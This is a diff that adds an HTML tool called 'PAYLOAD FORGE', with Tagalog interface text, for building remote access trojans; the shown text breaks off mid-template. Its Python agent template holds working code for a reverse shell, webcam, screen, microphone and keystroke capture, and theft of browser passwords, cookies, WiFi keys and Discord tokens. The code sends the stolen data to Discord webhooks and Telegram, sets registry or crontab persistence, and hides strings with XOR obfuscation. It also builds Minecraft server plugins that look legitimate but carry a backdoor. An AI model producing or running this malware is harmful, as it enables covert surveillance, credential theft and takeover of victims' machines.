@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>PAYLOAD FORGE v4 — by Shane</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:radial-gradient(900px 500px at 85% -5%,#16203a 0%,#0a0e1a 60%) fixed,#0a0e1a;color:#dbe4f0;font:14px/1.5 'Segoe UI',system-ui,Arial,sans-serif;padding:20px;min-height:100vh}
+.wrap{max-width:1080px;margin:0 auto}
+header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;margin-bottom:18px}
+h1{font-size:26px;letter-spacing:3px;background:linear-gradient(90deg,#22d3ee,#a78bfa,#f472b6);-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:900}
+.sub{color:#7a86a0;font-size:12px;letter-spacing:1px;margin-top:2px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap}
+.tabbtn{background:#131a2c;border:1px solid #25304d;color:#8fa0c0;padding:9px 16px;border-radius:999px;font-size:12.5px;font-weight:700;cursor:pointer;letter-spacing:.5px;transition:.18s}
+.tabbtn:hover{border-color:#22d3ee88;color:#e2e8f5}
+.tabbtn.act{background:linear-gradient(90deg,#0ea5e9,#8b5cf6);color:#fff;border-color:transparent;box-shadow:0 0 18px #8b5cf655}
+.page{display:none}.page.act{display:block;animation:fade .25s}
+@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1}}
+.card{background:#0f1524;border:1px solid #1e2942;border-radius:14px;padding:16px;margin-bottom:14px}
+h2{color:#7dd3fc;font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;display:flex;gap:8px;align-items:center}
+h2::before{content:'';width:4px;height:14px;border-radius:2px;background:linear-gradient(#22d3ee,#8b5cf6)}
+.row{display:flex;gap:12px;flex-wrap:wrap}
+.field{flex:1;min-width:150px}
+.lbl{display:block;font-size:10px;color:#7a86a0;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
+select,input[type=text],input[type=number]{width:100%;background:#0b1120;color:#dbe4f0;border:1px solid #273250;border-radius:8px;padding:8px 10px;font-size:13px}
+select:focus,input:focus{outline:none;border-color:#22d3ee}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:8px}
+.tile{display:flex;gap:8px;align-items:flex-start;background:#0b1120;border:1px solid #273250;border-radius:10px;padding:9px 10px;font-size:12.5px;cursor:pointer}
+.tile:hover{border-color:#22d3ee88}
+.tile input{accent-color:#22d3ee;margin-top:2px}
+.tile.sel{border-color:#22d3ee;background:#0e1a2b;box-shadow:0 0 10px #22d3ee22}
+.tile b{color:#e2e8f5}.tile small{color:#7a86a0}
+.rad{display:flex;gap:10px;flex-wrap:wrap}
+.rad label{background:#0b1120;border:1px solid #273250;border-radius:10px;padding:9px 13px;font-size:12.5px;cursor:pointer;display:flex;gap:8px}
+.rad label.sel{border-color:#a78bfa;background:#151229}
+.rad input{accent-color:#a78bfa}
+.btn{background:linear-gradient(90deg,#06b6d4,#8b5cf6);color:#fff;border:0;padding:14px;border-radius:10px;font-weight:800;font-size:14px;cursor:pointer;width:100%;letter-spacing:2px;box-shadow:0 6px 22px #06b6d433;transition:.2s}
+.btn:hover{transform:translateY(-1px);box-shadow:0 8px 28px #8b5cf655}
+.mini{background:#161d31;color:#c7d2e8;border:1px solid #2a3555;padding:8px 14px;border-radius:8px;cursor:pointer;font-size:12px;font-weight:700;transition:.15s}
+.mini:hover{border-color:#22d3ee;color:#7dd3fc}
+.bar{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+textarea{width:100%;background:#070b14;color:#7ef0d0;border:1px solid #1e2942;border-radius:10px;padding:12px;font:12px/1.45 Consolas,Menlo,monospace;white-space:pre;resize:vertical}
+.console{height:180px;white-space:pre-wrap}
+#out{height:400px}
+.status{color:#7dd3fc;font-size:12px;margin-top:10px;font-family:Consolas,monospace;white-space:pre-line;min-height:18px}
+.hint{font-size:12px;color:#7a86a0;line-height:1.8;white-space:pre-line}
+.vid{width:100%;height:220px;object-fit:contain;background:#000;border:1px solid #1e2942;border-radius:10px}
+.fitem{display:flex;justify-content:space-between;gap:10px;background:#0b1120;border:1px solid #273250;border-radius:8px;padding:6px 10px;margin-bottom:6px;font-size:12px}
+.fitem a{color:#22d3ee;text-decoration:none}
+.fitem a:hover{text-decoration:underline}
+.fname{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.chip{background:#131a2c;border:1px solid #2a3555;color:#c7d2e8;border-radius:7px;padding:4px 10px;font-size:11px;display:flex;gap:6px;align-items:center}
+.chip a{color:#22d3ee;text-decoration:none}
+.chip a:hover{text-decoration:underline}
+code{background:#0b1120;padding:1px 5px;border-radius:5px;color:#7dd3fc}
+footer{text-align:center;color:#44506b;font-size:11px;margin-top:16px;letter-spacing:1px}
+::-webkit-scrollbar{width:9px}::-webkit-scrollbar-track{background:#0a0e1a}::-webkit-scrollbar-thumb{background:#273250;border-radius:5px}::-webkit-scrollbar-thumb:hover{background:#22d3ee88}
+@media(max-width:640px){.field{min-width:100%}}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+<div><h1>PAYLOAD FORGE</h1><div class="sub">by Shane · v4.0 · single-file · works offline</div></div>
+<nav class="tabs">
+<button class="tabbtn act" onclick="tab('gen',this)">⚡ Generator</button>
+<button class="tabbtn" onclick="tab('forge',this)">🧩 Plugin Forge</button>
+<button class="tabbtn" onclick="tab('view',this)">📡 Live Viewer</button>
+<button class="tabbtn" onclick="tab('dec',this)">🔓 Decoder</button>
+</nav>
+</header>
+
+<!-- ================= GENERATOR ================= -->
+<div class="page act" id="pg-gen">
+<div class="card"><h2>1 · Setup</h2>
+<div class="row">
+<div class="field"><label class="lbl">Target Platform</label><select id="platform" onchange="updateUI()"><option>Windows</option><option>Android (Termux)</option><option>Linux</option><option>macOS</option><option>iOS (iSH)</option></select></div>
+<div class="field"><label class="lbl">Payload Type</label><select id="ptype" onchange="updateUI()"><option value="script">Standard Script</option><option value="usb">USB Drop (Ducky)</option><option value="hta">HTA Dropper (self-contained)</option></select></div>
+<div class="field" id="f-lang"><label class="lbl">Language</label><select id="lang" onchange="updateUI()"><option value="python">Python 3 (full)</option><option value="powershell">PowerShell (TCP shell)</option><option value="bash">Bash (TCP shell)</option></select></div>
+<div class="field"><label class="lbl">Output Filename</label><input type="text" id="pname" placeholder="payload"></div>
+</div></div>
+
+<div class="card"><h2>2 · C2 / Exfil</h2>
+<div class="row">
+<div class="field" id="f-method"><label class="lbl">Method</label><select id="method" onchange="updateUI()"><option value="http">🌐 HTTP C2 (LAN + Live Viewer)</option><option value="tcp+http">🔌 Reverse TCP + HTTP Viewer</option><option value="tcp">Reverse TCP</option><option value="tcp+discord">Reverse TCP + Discord</option><option value="tcp+telegram">Reverse TCP + Telegram</option><option value="discord">Discord Webhook</option><option value="telegram">Telegram Bot</option></select></div>
+<div class="field"><label class="lbl">Host / Listener IP</label><input type="text" id="host" placeholder="192.168.1.50"></div>
+<div class="field" id="f-port"><label class="lbl">TCP Port</label><input type="number" id="port" value="4444"></div>
+<div class="field" id="f-http" style="display:none"><label class="lbl">HTTP C2 Port</label><input type="number" id="httpport" value="8080"></div>
+</div>
+<div class="row" id="cfgDiscord" style="margin-top:10px;display:none"><div class="field" style="flex:2"><label class="lbl">Discord Webhook URL</label><input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..."></div></div>
+<div class="row" id="cfgTelegram" style="margin-top:10px;display:none"><div class="field"><label class="lbl">Bot Token</label><input type="text" id="token" placeholder="123456:ABC..."></div><div class="field"><label class="lbl">Chat ID</label><input type="text" id="chatid" placeholder="123456789"></div></div>
+</div>
+
+<div class="card" id="autoCard"><h2>3 · Auto-Run</h2>
+<div class="rad">
+<label class="sel"><input type="radio" name="ar" value="full" checked> ▶ Run now + Autorun (persistence)</label>
+<label><input type="radio" name="ar" value="autorun"> 🔁 Autorun only (silent, exit)</label>
+<label><input type="radio" name="ar" value="manual"> 🧍 Manual only</label>
+</div></div>
+
+<div class="card" id="capsCard"><h2>4 · Capabilities (Python)</h2>
+<div class="grid" id="capsGrid"></div>
+<p class="hint" style="margin-top:10px;font-size:11px">Live Screen / Live Webcam = auto-enable kapag HTTP method. Data Stealer = Chrome/Edge passwords, cookies, history, WiFi keys, Discord tokens.</p></div>
+
+<div class="card"><h2>5 · Obfuscation</h2>
+<div class="row">
+<div class="field"><label class="lbl">Obfuscation</label><select id="obf"><option value="xor">🔐 XOR + Base64 (unreadable)</option><option value="none">None (plain)</option></select></div>
+<div class="field"><label class="lbl">Download Format</label><select id="fmt" style="display:none"></select></div>
+</div></div>
+
+<button class="btn" onclick="generate()">⚡ GENERATE PAYLOAD</button>
+<div class="status" id="status"></div>
+
+<div class="card" style="margin-top:14px"><h2>Generated Code</h2>
+<textarea id="out" readonly placeholder="Pindutin ang GENERATE — lalabas dito ang buong code."></textarea>
+<div class="bar">
+<button class="mini" onclick="copyOut()">📋 Copy</button>
+<button class="mini" onclick="download()">💽 Download</button>
+<button class="mini" onclick="generate()">↻ Regenerate</button>
+<button class="mini" onclick="$('out').value='';statusMsg('Cleared')">🧹 Clear</button>
+</div>
+<div class="chips" id="fileChips"></div>
+</div>
+
+<div class="card"><h2>Quick Notes</h2><div class="hint" id="hint"></div></div>
+</div>
+
+<!-- ================= PLUGIN FORGE ================= -->
+<div class="page" id="pg-forge">
+<div class="card"><h2>Fake Plugin Wizard</h2>
+<p class="hint">Gumagawa ng kumpletong Spigot plugin project (Main.java + plugin.yml + build.bat + README) na mukhang lehitimong plugin pero may reverse-shell RCE. I-compile gamit ang spigot-1.20.x.jar, i-drop sa /plugins. TCP shell sa listener + in-game command /rat &lt;cmd&gt;.</p>
+<div class="row">
+<div class="field"><label class="lbl">Theme</label><select id="ftheme"><option value="anticheat">AntiCheatPlus</option><option value="economy">EconomyCore</option><option value="essentials">EssentialsReborn</option><option value="enchant">CustomEnchantsX</option><option value="permissions">PermsPro</option></select></div>
+<div class="field"><label class="lbl">Plugin Name</label><input type="text" id="fname" value="AntiCheatPlus"></div>
+<div class="field"><label class="lbl">Author</label><input type="text" id="fauth" value="SpigotMC"></div>
+<div class="field"><label class="lbl">Version</label><input type="text" id="fver" value="1.0.0"></div>
+</div>
+<div class="row">
+<div class="field"><label class="lbl">Listener Host</label><input type="text" id="fhost" placeholder="192.168.1.50"></div>
+<div class="field"><label class="lbl">TCP Port</label><input type="number" id="fport" value="4444"></div>
+<div class="field"><label class="lbl">Strings</label><select id="fobf"><option value="1">🔐 XOR-obfuscated</option><option value="0">Plain</option></select></div>
+</div>
+<div class="bar"><button class="mini" onclick="forgeFake()">🧩 Generate Fake Plugin (ZIP)</button></div>
+<div class="status" id="st2"></div>
+<textarea id="out2" readonly placeholder="Generated Main.java lalabas dito..."></textarea>
+<div class="bar"><button class="mini" onclick="copyTxt('out2','st2')">📋 Copy</button><button class="mini" onclick="dlTxt('out2','Main.java','st2')">💽 Download .java</button><button class="mini" onclick="dlZip2()">📦 Download Project ZIP</button></div>
+</div>
+
+<div class="card"><h2>Inject RCE sa Real Plugin (upload .jar)</h2>
+<p class="hint">I-upload ang totoong plugin jar — babasahin nito ang plugin.yml (name, main, version, commands). Gagawa ito ng "loader" project: <b>i-move ang original jar papunta sa plugins/Libs/</b>, tapos ang bagong jar (parehong plugin name, version+1) ang pumalit sa plugins root. Kinakarga nito ang original sa runtime habang may backdoor.</p>
+<div class="row">
+<div class="field" style="flex:2"><label class="lbl">Plugin .jar</label><input type="file" id="jfile" accept=".jar,.zip"></div>
+<div class="field"><label class="lbl">Listener Host</label><input type="text" id="jh" placeholder="192.168.1.50"></div>
+<div class="field"><label class="lbl">TCP Port</label><input type="number" id="jp" value="4444"></div>
+</div>
+<div class="bar"><button class="mini" onclick="parseJar()">🔍 Read plugin.yml</button><button class="mini" onclick="forgeHijack()">🧬 Generate Loader Project (ZIP)</button></div>
+<div class="status" id="st3"></div>
+<div class="hint" id="jinfo"></div>
+</div>
+</div>
+
+<!-- ================= LIVE VIEWER ================= -->
+<div class="page" id="pg-view">
+<div class="card"><h2>1 · Receiver Setup</h2>
+<p class="hint">Kung HTTP C2 ang payload: ilagay ang IP ng target at i-Connect (naka-on ang CORS sa payload server). Kung Reverse TCP: i-download ang receiver.py at patakbuhin — gagana kahit walang browser listener.</p>
+<div class="row">
+<div class="field"><label class="lbl">Target IP</label><input type="text" id="tip" placeholder="192.168.1.100"></div>
+<div class="field"><label class="lbl">HTTP C2 Port</label><input type="number" id="tiport" value="8080"></div>
+</div>
+<div class="bar"><button class="mini" onclick="connectHTTP()">🔗 Connect HTTP C2</button><button class="mini" onclick="downloadReceiver()">📡 Download receiver.py</button></div>
+<div class="status" id="vstatus">Idle — ilagay ang IP ng target at i-Connect.</div></div>
+
+<div class="card"><h2>2 · Live Views</h2>
+<div class="row">
+<div class="field" style="flex:1"><label class="lbl">Live Screen</label><img id="scrImg" class="vid" alt="waiting..."></div>
+<div class="field" style="flex:1"><label class="lbl">Live Webcam</label><img id="camImg" class="vid" alt="waiting..."></div>
+</div>
+<div class="bar">
+<button class="mini" onclick="toggleStream()">⏯ Pause/Resume</button>
+<button class="mini" onclick="refreshViews()">↻ Refresh Now</button>
+<select id="fps" style="width:150px" onchange="setFps()"><option value="1000">1 fps</option><option value="500">2 fps</option><option value="2000">0.5 fps</option></select>
+</div></div>
+
+<div class="card"><h2>3 · Remote Shell (HTTP C2)</h2>
+<textarea id="vlog" class="console" readonly placeholder="Shell output..."></textarea>
+<div class="cmdrow" style="display:flex;gap:8px;margin-top:8px"><input type="text" id="vcmd" placeholder="command: dir / whoami / ipconfig / ls -la" style="flex:1;background:#0b1120;color:#dbe4f0;border:1px solid #273250;border-radius:8px;padding:9px" onkeydown="if(event.key==='Enter')sendCmd()"><button class="mini" onclick="sendCmd()">▶ SEND</button></div>
+<div class="bar"><button class="mini" onclick="qcmd('dir')">dir</button><button class="mini" onclick="qcmd('whoami')">whoami</button><button class="mini" onclick="qcmd('ipconfig')">ipconfig</button><button class="mini" onclick="qcmd('systeminfo')">systeminfo</button><button class="mini" onclick="qcmd('ls -la')">ls -la</button><button class="mini" onclick="qcmd('uname -a')">uname -a</button><button class="mini" onclick="vlogClear()">🧹 Clear</button></div></div>
+
+<div class="card"><h2>4 · Files &amp; Stealer</h2>
+<div class="bar">
+<button class="mini" onclick="refreshFiles()">↻ Refresh Files</button>
+<button class="mini" onclick="triggerSteal()">💾 Trigger Stealer</button>
+<button class="mini" onclick="qcmd('shot')">🖼 Screenshot</button>
+<button class="mini" onclick="qcmd('cam')">📷 Webcam</button>
+</div>
+<div id="vfiles" class="hint" style="margin-top:10px">Walang konektadong target.</div></div>
+</div>
+
+<!-- ================= DECODER ================= -->
+<div class="page" id="pg-dec">
+<div class="card"><h2>XOR + Base64 Tool</h2>
+<textarea id="decIn" placeholder="I-paste: XORKEY:... / BASE64:... / S(&quot;\\u00xx...&quot;) / plain code para i-encode..."></textarea>
+<div class="bar">
+<button class="mini" onclick="doDecode()">🔓 Decode</button>
+<button class="mini" onclick="doEncode()">🔐 Encode (XOR+Base64)</button>
+<button class="mini" onclick="copyDec()">📋 Copy Result</button>
+<button class="mini" onclick="downloadDec()">💾 Download Result</button>
+</div>
+<textarea id="decOut" class="console" readonly placeholder="Result..."></textarea></div>
+<div class="card"><h2>Paano gumagana</h2>
+<div class="hint">• <b>XORKEY:</b>… — payload na naka-XOR (key: SHANE) + Base64. Hindi nababasa sa notepad, hindi nadetect ng string-scanning.<br>• <b>S("...")</b> — obfuscated string sa loob ng plugin (auto-decrypt sa runtime).<br>• <b>BASE64:</b>… — base64-encoded code.<br>• <b>Encode</b> — gagawing XORKEY payload ang plain code.<br>• Ang obfuscation ay pang-iwas sa static string detection LANG — hindi nito nilalabanan ang AV/EDR.</div></div>
+</div>
+
+<footer>PAYLOAD FORGE v4 · by Shane · single-file HTML · offline · 2026</footer>
+</div>
+
+<script>
+/* ============ core helpers ============ */
+const KEY="SHANE";
+const CAPS=[["sysinfo","🖥 System Info","OS, host, user, public IP"],["screenshot","🖼 Screenshot","desktop capture"],["live","📺 Live Screen","HTTP stream (needs HTTP C2)"],["webcam","📷 Webcam Shot","single frame"],["livecam","🎥 Live Webcam","HTTP stream (needs HTTP C2)"],["mic","🎙 Microphone","8s recording"],["files","📁 Grab Files","zip docs/keys"],["stealer","💳 Data Stealer","Chrome/Edge passwords, WiFi keys, Discord tokens"],["keylog","⌨ Keylogger","20s capture (pynput)"],["location","📍 Location","GeoIP / Termux GPS"],["persist","🔁 Persistence","registry / crontab autorun"]];
+const $=id=>document.getElementById(id);
+const val=id=>$(id).value.trim();
+function c(id){const e=$('capsGrid').querySelector('input[value="'+id+'"]');return e?!!e.checked:false}
+function esc(s){return s.replace(/[&<>"]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[m]))}
+function fill(t,o){for(const k in o)t=t.split('@@'+k+'@@').join(o[k]);return t}
+function selAR(){return document.querySelector('input[name=ar]:checked').value}
+function sanitize(n){return (n||'').replace(/[^\w.\- ]/g,'').trim()||'payload'}
+function tab(n,btn){document.querySelectorAll('.tabbtn').forEach(b=>b.classList.remove('act'));document.querySelectorAll('.page').forEach(p=>p.classList.remove('act'));$('pg-'+n).classList.add('act');if(btn)btn.classList.add('act')}
+function statusMsg(m){$('status').textContent=m}
+function xorEncode(str){let o='';for(let i=0;i<str.length;i++)o+=String.fromCharCode(str.charCodeAt(i)^KEY.charCodeAt(i%KEY.length));return btoa(unescape(encodeURIComponent(o)))}
+function xorDecode(b64){let s;try{s=decodeURIComponent(escape(atob(b64)))}catch(e){try{s=atob(b64)}catch(e2){return ''}}let o='';for(let i=0;i<s.length;i++)o+=String.fromCharCode(s.charCodeAt(i)^KEY.charCodeAt(i%KEY.length));return o}
+function b64u(s){return btoa(unescape(encodeURIComponent(s)))}
+function ub64(s){return decodeURIComponent(escape(atob(s)))}
+function psEnc(cmd){let u='';for(let i=0;i<cmd.length;i++)u+=cmd.charAt(i)+'\0';return btoa(u)}
+function saveBlob(blob,name){const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name;document.body.appendChild(a);a.click();setTimeout(()=>{URL.revokeObjectURL(a.href);a.remove()},900)}
+function fbCopy(t,done){const ta=document.createElement('textarea');ta.value=t;document.body.appendChild(ta);ta.select();try{document.execCommand('copy');done()}catch(e){statusMsg('❌ Hindi ma-copy')}ta.remove()}
+function copyText(t,st){if(!t)return;const done=()=>{if(st)$(st).textContent='📋 Na-copy sa clipboard!'};if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(t).then(done).catch(()=>fbCopy(t,done));else fbCopy(t,done)}
+
+/* ============ dynamic UI ============ */
+function updateUI(){
+ const pt=$('ptype').value,lg=$('lang').value,m=$('method').value;
+ const isPy=pt==='script'&&lg==='python';
+ const pyish=isPy||pt==='usb'||pt==='hta';
+ $('f-lang').style.display=pt==='script'?'':'none';
+ $('f-method').style.display=isPy?'':'none';
+ $('f-port').style.display=(pt==='script'||pt==='usb'||pt==='hta')?'':'none';
+ $('f-http').style.display=(isPy&&(m==='http'||m==='tcp+http'))?'':'none';
+ $('cfgDiscord').style.display=(isPy&&m.includes('discord'))?'':'none';
+ $('cfgTelegram').style.display=(isPy&&m.includes('telegram'))?'':'none';
+ $('autoCard').style.display=pyish?'':'none';
+ $('capsCard').style.display=pyish?'':'none';
+ if(pt==='script'&&lg!=='python'&&!m.startsWith('tcp'))$('method').value='tcp';
+ if((pt==='usb'||pt==='hta')&&!m.startsWith('tcp'))$('method').value='tcp';
+ setHint();
+}
+function setHint(){
+ const pt=$('ptype').value,lg=$('lang').value,pl=$('platform').value,m=$('method').value;
+ let h='';
+ if(pt==='hta')h='💾 Self-contained HTA dropper: pag binuksan sa Windows, magda-download ito ng hidden PowerShell na magde-decode at magpapatakbo ng Python payload (TCP). Walang kailangang HTTP server.\n▶ Listener: python receiver.py '+($('port').value||4444);
+ else if(pt==='usb')h='💾 payload.txt (Ducky/Flipper BadUSB) + run.bat. I-serve ang run.bat mula sa iyong machine: python -m http.server 80 (sa folder ng run.bat).\n▶ Sa Flipper: i-encode ang payload.txt gamit ang web ducky encoder. Listener: python receiver.py '+($('port').value||4444);
+ else if(lg!=='python')h='🔌 PowerShell/Bash TCP shell. Listener: python receiver.py '+($('port').value||4444)+' (o nc -lvnp '+($('port').value||4444)+').';
+ else if(m.startsWith('tcp'))h='🔌 Listener: python receiver.py '+($('port').value||4444)+'. Malayong target? I-port-forward ang '+($('port').value||4444)+' papunta sa IP mo.';
+ else if(m==='http')h='🌐 LAN/offline: i-run ang payload sa target — magsisimula ito ng HTTP C2 sa port '+($('httpport').value||8080)+'. Buksan ang Live Viewer tab, ilagay ang IP ng target, i-Connect.';
+ else h='💬 Results (system info, stealer, files, screenshots) idedeliver sa Discord/Telegram. Remote shell: TCP listener sa port '+($('port').value||4444)+'.';
+ if(pl==='Android (Termux)'||pl==='iOS (iSH)')h+='\n📱 Termux: pkg install python -y; pip install requests; python payload.py';
+ $('hint').textContent=h;
+}
+
+/* ============ capability tiles ============ */
+(function(){
+ const g=$('capsGrid');
+ CAPS.forEach(([v,t,d])=>{const l=document.createElement('label');l.className='tile';l.innerHTML='<input type="checkbox" value="'+v+'"><span><b>'+t+'</b><br><small>'+d+'</small></span>';l.onclick=e=>{if(e.target.tagName==='INPUT')l.classList.toggle('sel',e.target.checked)};g.appendChild(l)});
+ ['sysinfo','screenshot','stealer','persist'].forEach(v=>{const cb=g.querySelector('input[value="'+v+'"]');if(cb){cb.checked=true;cb.closest('.tile').classList.add('sel')}});
+ document.querySelectorAll('.rad label').forEach(r=>r.onclick=()=>{document.querySelectorAll('.rad label').forEach(x=>x.classList.remove('sel'));r.classList.add('sel')});
+})();
+
+/* ============ Python agent ============ */
+const PY_TEMPLATE=String.raw`#!/usr/bin/env python3
+import socket,subprocess,os,sys,threading,time,base64,json,platform,urllib.request,urllib.parse,shutil,re
+HOST="@@HOST@@";PORT=@@PORT@@;HPORT=@@HPORT@@;MODE="@@MODE@@"
+WEBHOOK="@@WEBHOOK@@";TOK="@@TOK@@";CID="@@CID@@";AR="@@AR@@"
+CAPS=@@CAPS@@
+IS_WIN=os.name=='nt'
+def sh(c,t=25):
+ try:return subprocess.check_output(c,shell=True,stderr=subprocess.STDOUT,timeout=t).decode('utf-8','ignore')
+ except Exception as e:return '[err] '+str(e)
+def info():
+ d={'os':platform.platform(),'host':socket.gethostname(),'user':os.getenv('USERNAME') or os.getenv('USER') or '','cwd':os.getcwd()}
+ try:d['ip']=urllib.request.urlopen('https://api.ipify.org',timeout=8).read().decode()
+ except:pass
+ return json.dumps(d)
+def shot():
+ p='/tmp/s.png'
+ try:
+  try:
+   from PIL import ImageGrab
+   ImageGrab.grab().save(p);return p
+  except:
+   import mss
+   mss.mss().shot(output=p);return p
+ except:
+  r=sh('termux-screenshot -d /sdcard/s.png 2>/dev/null && echo ok || echo -n')
+  return '/sdcard/s.png' if 'ok' in r else ''
+def cam():
+ try:
+  import cv2
+  c=cv2.VideoCapture(0);ok,f=c.read();c.release()
+  if ok:cv2.imwrite('/tmp/c.png',f);return '/tmp/c.png'
+ except:pass
+ r=sh('termux-camera-photo -c 0 /sdcard/c.png 2>/dev/null && echo ok || echo -n')
+ return '/sdcard/c.png' if 'ok' in r else ''
+def mic():
+ try:
+  import sounddevice as sd,numpy as np,wave
+  a=sd.rec(44100*8,44100,1);sd.wait()
+  w=wave.open('/tmp/m.wav','w');w.setnchannels(1);w.setsampwidth(2);w.setframerate(44100);w.writeframes((a*32767).astype('int16').tobytes());w.close()
+  return '/tmp/m.wav'
+ except:return ''
+def b64f(p):
+ try:
+  with open(p,'rb') as f:return base64.b64encode(f.read()).decode()
+ except:return ''
+def exfil(txt,fn='',fp=''):
+ try:
+  if WEBHOOK:
+   b=b'------b\r\nContent-Disposition: form-data; name="content"\r\n\r\n'+txt.encode()[:1990]+b'\r\n'
+   if fp and os.path.exists(fp):
+    b+=b'------b\r\nContent-Disposition: form-data; name="file"; filename="'+fn.encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'+open(fp,'rb').read()+b'\r\n'
+   b+=b'------b--\r\n'
+   urllib.request.urlopen(urllib.request.Request(WEBHOOK,data=b,headers={'Content-Type':'multipart/form-data; boundary=------b'}),timeout=10)
+  if TOK and CID:
+   urllib.request.urlopen(urllib.request.Request('https://api.telegram.org/bot'+TOK+'/sendMessage',data=urllib.parse.urlencode({'chat_id':CID,'text':txt[:3990]}).encode()),timeout=10)
+   if fp and os.path.exists(fp):
+    b=b'------b\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n'+CID.encode()+b'\r\n------b\r\nContent-Disposition: form-data; name="document"; filename="'+fn.encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'+open(fp,'rb').read()+b'\r\n------b--\r\n'
+    urllib.request.urlopen(urllib.request.Request('https://api.telegram.org/bot'+TOK+'/sendDocument',data=b,headers={'Content-Type':'multipart/form-data; boundary=------b'}),timeout=15)
+ except Exception:pass
+ def
+def ex2(fn,fp,txt):
+ if WEBHOOK or (TOK and CID):
+  try:exfil(txt,fn,fp)
+  except:pass
+def steal():
+ out='/tmp/st_'+str(int(time.time()));os.makedirs(out,exist_ok=True)
+ if IS_WIN:
+  for env in ('LOCALAPPDATA','APPDATA'):
+   b=os.environ.get(env,'')
+   for br in ('Google\\Chrome\\User Data','Microsoft\\Edge\\User Data'):
+    tag=br.split('\\')[0]
+    for prof in ('Default','Profile 1','Profile 2'):
+     p=os.path.join(b,br,prof)
+     for fn in ('Login Data','Local State','Cookies','History'):
+      f=os.path.join(p,fn)
+      if os.path.exists(f):
+       try:shutil.copy(f,os.path.join(out,tag+'_'+prof+'_'+fn))
+       except:pass
+  sh('netsh wlan show profiles > "'+out.replace('\\','/')+'/wifi.txt"')
+  d=os.path.join(os.environ.get('APPDATA',''),'discord','Local Storage','leveldb')
+  if os.path.exists(d):
+   for f in os.listdir(d):
+    try:
+     for m in re.finditer(rb'[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27,}',open(os.path.join(d,f),'rb').read()):
+      open(os.path.join(out,'dtok.txt'),'ab').write(m.group()+b'\n')
+    except:pass
+ z=shutil.make_archive(out,'zip',out)
+ return z
+def keylog():
+ try:
+  from pynput import keyboard
+  ks=[]
+  def on(k):
+   ks.append(str(k));return len(ks)<400
+  l=keyboard.Listener(on_press=on);l.start();time.sleep(20);l.stop()
+  return ' '.join(ks)
+ except Exception as e:return '[err] '+str(e)
+def loc():
+ try:return json.dumps(json.load(urllib.request.urlopen('http://ip-api.com/json',timeout=8)))
+ except Exception as e:return str(e)
+def persist():
+ try:
+  if IS_WIN:
+   p=os.path.abspath(sys.argv[0])
+   subprocess.Popen('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /d "'+p+'" /f',shell=True)
+  else:
+   p=os.path.abspath(sys.argv[0])
+   sh('(crontab -l 2>/dev/null; echo "@reboot nohup python3 '+p+' >/dev/null 2>&1 &")|crontab -')
+  return 'persist ok'
+ except Exception as e:return str(e)
+def files():
+ ds=[os.path.expanduser('~')]
+ if IS_WIN:ds+=['~/Documents','~/Desktop','~/Downloads']
+ out=[]
+ for d in ds:
+  try:
+   for r,_,fs in os.walk(os.path.expanduser(d)):
+    if len(out)>=200:break
+    for f in fs:
+     p=os.path.join(r,f)
+     try:
+      if os.path.getsize(p)<5242880:out.append(p)
+     except:pass
+  except:pass
+ return '\n'.join(out)
+def serve():
+ try:
+  from http.server import BaseHTTPRequestHandler,ThreadingHTTPServer
+  class H(BaseHTTPRequestHandler):
+   def log_message(self,*a):pass
+   def end_headers(self):
+    self.send_header('Access-Control-Allow-Origin','*')
+    super().end_headers()
+   def do_GET(self):
+    u=urllib.parse.urlparse(self.path);p=u.path;q=urllib.parse.parse_qs(u.query)
+    try:
+     if p=='/':r=info()
+     elif p=='/info':r=info()
+     elif p=='/cmd':r=sh(q.get('c',[''])[0])
+     elif p=='/list':r=files()
+     elif p=='/get':r=b64f(q.get('f',[''])[0])
+     elif p=='/sc':r=b64f(shot())
+     elif p=='/cam':r=b64f(cam())
+     elif p=='/mic':r=b64f(mic())
+     elif p=='/steal':
+      z=steal();ex2('steal.zip',z,'[steal]');r=b64f(z)
+     elif p=='/shot':
+      f=shot();ex2('s.png',f,'[shot]');r=b64f(f)
+     elif p=='/keylog':r=keylog()
+     elif p=='/loc':r=loc()
+     elif p=='/persist':r=persist()
+     else:r='404'
+     b=r.encode()
+     self.send_response(200);self.send_header('Content-Type','text/plain');self.send_header('Content-Length',str(len(b)));self.end_headers();self.wfile.write(b)
+    except Exception as e:
+     try:
+      b=('ERR '+str(e)).encode();self.send_response(200);self.send_header('Content-Length',str(len(b)));self.end_headers();self.wfile.write(b)
+     except:pass
+  ThreadingHTTPServer(('0.0.0.0',HPORT),H).serve_forever()
+ except:pass
+def tcp():
+ while 1:
+  try:
+   s=socket.socket();s.settimeout(300);s.connect((HOST,PORT))
+   while 1:
+    try:cmd=s.recv(4096).decode().strip()
+    except:break
+    if not cmd:break
+    if cmd=='exit':s.close();return
+    elif cmd=='info':r=info()
+    elif cmd=='shot':
+     f=shot();ex2('s.png',f,'[shot]');r=b64f(f)
+    elif cmd=='cam':
+     f=cam();ex2('c.png',f,'[cam]');r=b64f(f)
+    elif cmd=='mic':
+     f=mic();ex2('m.wav',f,'[mic]');r=b64f(f)
+    elif cmd=='steal':
